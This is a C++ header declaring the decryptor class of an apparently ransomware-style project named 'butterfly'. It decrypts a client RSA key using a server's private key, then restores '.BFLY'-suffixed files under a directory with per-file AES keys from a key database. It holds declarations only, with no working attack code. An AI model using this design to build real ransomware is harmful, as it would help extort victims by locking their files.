
#ifndef BUTTERFLY_DECRYPTOR_H
#define BUTTERFLY_DECRYPTOR_H

#include "crypto/rsaDecryptor.h"
#include "crypto/aesDecryptor.h"
#include "directoryIterator.h"
#include "aesKeyDatabase.h"
#include "params.h"

namespace butterfly
{

namespace hybrid
{

/**
 * Class Decryptor to decrypt all files with AES and the CPrivateRSA as well as AES key with RSA
 */
class Decryptor
{

private:
    std::string _decryptedCPrivateRSA, _aesKeyDbFilepath;;
    std::shared_ptr<rsa::RSADecryptor> _rsaDecryptorAESKey, _rsaDecryptorCPrivateRSA;
    std::unique_ptr<aes::AESDecryptor> _aesDecryptor;
    std::unique_ptr<AESKeyDatabase> _aesKeyDatabase;

    /**
     *
     * @param filepath
     */
    static void removeBFLYEnding(std::string &filepath);

    /**
     *
     */
    static void removeDecryptedFiles();

public:

    /**
     * Constructor Decryptor
     *
     *  Usage:
     *       std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor(2048));
     *       decryptor->decryptCPrivateRSA("SPrivateRSA.pem", "CPrivateRSA.bin");
     *       decryptor->invokeDir("/home/");
     *
     * @param aesKeyDbFilepath:
     */
    explicit Decryptor(const std::string &aesKeyDbFilepath = "AES.db");

    /**
     * Destructor Decryptor
     */
    ~Decryptor();

    /**
     *
     * @param path
     */
    void invokeDir(const std::string &path);

    /**
     * Decrypt the CPrivateRSA.bin file
     *
     * @param pkeyFromServer: SPrivateRSA.pem from server
     * @param encCPrivateRSAFile: encrypted CPrivateRSA.bin file
     * @return decrypted CPrivateRSA string
     */
    std::string decryptCPrivateRSA(const std::string &pkeyFromServer, const std::string &encCPrivateRSAFile);

    /**
     *
     * @param filepath
     * @return
     */
    std::string  decryptAESKeyPair(const std::string &filepath, const std::string &type);

    /**
     * Decrypt the file with the AES Key
     *
     * @param filepath: path to the file
     * @param aesKey: aes key for the file
     */
    void decryptFileWithAES(const std::string &filepath, const std::string &aesKey, const std::string & aesIV);

};

} // namespace hybrid

} // namespace butterfly

#endif //BUTTERFLY_DECRYPTOR_H
